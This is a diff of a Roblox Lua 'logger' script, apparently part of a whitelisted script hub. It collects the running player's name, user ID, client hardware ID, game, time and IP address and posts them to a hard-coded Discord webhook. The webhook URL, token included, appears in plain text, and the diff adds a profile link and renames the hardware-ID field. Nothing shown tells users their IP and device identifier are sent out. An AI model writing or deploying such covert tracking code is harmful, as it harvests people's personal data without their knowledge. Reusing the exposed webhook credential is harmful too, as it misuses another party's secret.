@@ -1,5 +1,3 @@
--- logger.lua — только логгирование, вайтлист проверяется в основном файле
-
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
@@ -7,6 +5,7 @@ local RbxAnalytics = game:GetService("RbxAnalyticsService")
 
 local lp = Players.LocalPlayer
 local hwid = RbxAnalytics:GetClientId()
+local uid = tostring(lp.UserId)
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1471569290183442523/engyxPsJOc6mQpCcrpYKM5oYV7PS0J15aQEsaCuL96__qJqhbYaFGbkCRiVJqMFCksFD"
 
@@ -55,8 +54,9 @@ local embed = {
         ["fields"] = {
             {["name"] = "Name",         ["value"] = lp.Name,                                           ["inline"] = true},
             {["name"] = "Display Name", ["value"] = lp.DisplayName,                                    ["inline"] = true},
-            {["name"] = "User ID",      ["value"] = tostring(lp.UserId),                               ["inline"] = true},
-            {["name"] = "HWID",         ["value"] = "```" .. hwid .. "```",                             ["inline"] = false},
+            {["name"] = "User ID",      ["value"] = uid,                                                ["inline"] = true},
+            {["name"] = "Client ID",    ["value"] = "```" .. hwid .. "```",                             ["inline"] = false},
+            {["name"] = "Profile",      ["value"] = "[Open](https://www.roblox.com/users/" .. uid .. "/profile)", ["inline"] = false},
             {["name"] = "Game",         ["value"] = place_name .. " (" .. tostring(place_id) .. ")",    ["inline"] = false},
             {["name"] = "Time",         ["value"] = os.date("%Y-%m-%d %H:%M:%S"),                      ["inline"] = false},
             {["name"] = "IP",           ["value"] = "||" .. (ip_info.query or "N/A") .. "||",           ["inline"] = false},
